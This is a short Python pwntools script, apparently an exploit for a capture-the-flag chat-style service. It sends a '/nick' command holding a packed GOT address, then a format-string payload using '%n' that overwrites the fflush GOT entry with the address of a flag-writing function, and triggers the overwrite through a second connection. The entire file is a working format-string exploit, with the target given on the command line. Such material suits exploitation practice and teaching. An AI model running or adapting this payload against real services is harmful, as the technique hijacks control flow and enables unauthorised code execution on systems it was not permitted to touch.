#!/usr/bin/env python

# my original exploit no longer worked with the new base address
# fortunately i did not have to write a new one, i could instead steal this
# courtesy of akg

from pwn import *
import sys

fflush_got = 0x13020
write_flag = 0x11340

host = sys.argv[1]
port = int(sys.argv[2])

r0 = remote(host, port)

address = fflush_got
to_write = write_flag

r0.sendline("/nick "+p32(address))
r0.sendline("%%%dd"%(to_write-5) + "%2$n")
r0.recvuntil("> ")
r1 = remote(host, port)
r1.recvuntil("> ")
r1.recvline()
r1.close()

r0.recvline()
r0.sendline()
print r0.recvuntil("Congrats"),
print r0.recvline()
r0.close()
